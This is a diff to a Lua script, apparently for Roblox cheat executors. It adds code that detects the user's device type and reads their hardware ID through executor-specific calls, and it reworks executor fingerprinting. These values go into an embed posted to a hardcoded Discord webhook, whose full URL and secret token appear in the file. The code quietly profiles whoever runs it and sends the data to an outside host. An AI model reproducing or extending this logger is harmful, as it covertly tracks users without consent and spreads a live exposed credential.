@@ -1,5 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 local webhookURL = "https://discord.com/api/webhooks/1379975488046370850/nvqrA47lMwWwXew2ySdAwcnqZ63cJ-w25UDmslTbEoE_QY3tt94B4R7RN9LrFMQxt_8J"
 
 local player = game.Players.LocalPlayer
@@ -8,22 +9,58 @@ local userId = player and player.UserId or 0
 local scriptVersion = "1.3.0"
 local maxRetries = 10
 
+-- Чёткое определение платформы
+local function DetectDeviceType()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "Unknown"
+    end
+end
+
+local deviceType = DetectDeviceType()
+
+-- HWID detection
+local hwid = "Недоступно"
+pcall(function()
+    if syn and syn.gethwid then
+        hwid = syn.gethwid()
+    elseif gethwid then
+        hwid = gethwid()
+    elseif fluxus and getgenv and getgenv().fluxus then
+        hwid = tostring(getgenv().fluxus.HWID or "Недоступно")
+    elseif delta and get_hw_id then
+        hwid = tostring(get_hw_id())
+    end
+end)
+-- <--- КОПИРОВАНИЕ В БУФЕР УДАЛЕНО --->
+
 local function GetExecutorName()
     local ok, exec = pcall(function()
-        if typeof(syn) == "table" or getgenv().syn then return "Synapse X" end
-        if typeof(KRNL) == "table" or getgenv().KRNL then return "KRNL" end
-        if typeof(fluxus) == "table" or getgenv().fluxus then return "Fluxus" end
-        if typeof(WRD) == "table" or getgenv().WRD then return "WRD" end
-        if secure_load then return "Secure Load" end
-        if identifyexecutor then
+        if syn and typeof(syn) == "table" then return "Synapse X" end
+        if KRNL_LOADED or (KRNL and typeof(KRNL) == "table") then return "KRNL" end
+        if fluxus and typeof(fluxus) == "table" then return "Fluxus" end
+        if identifyexecutor and typeof(identifyexecutor) == "function" then
             local name = identifyexecutor()
             if name and name ~= "" then return name end
+        end
+        if WRD then return "WRD" end
+        if getgenv then
+            if getgenv().syn then return "Synapse X" end
+            if getgenv().KRNL then return "KRNL" end
+            if getgenv().fluxus then return "Fluxus" end
+            if getgenv().WRD then return "WRD" end
         end
         if getrenv then
             local r = getrenv()
             if r and r.is_sentinel then return "Sentinel" end
             if r and r.is_oxygen then return "OxygenU" end
         end
+        if secure_load then return "Secure Load" end
         return "Unknown"
     end)
     return ok and exec or "Unknown"
@@ -103,6 +140,8 @@ local embedFields = {
     {name = "📈 Уровень инжектора", value = executorLevel, inline = false},
     {name = "💰 Баланс", value = balance .. " руб", inline = false},
     {name = "🎮 Игра", value = realGameName, inline = false},
+    {name = "🔒 HWID", value = hwid, inline = false},
+    {name = "🖥️ Устройство", value = deviceType, inline = true},
 }
 
 local data = {
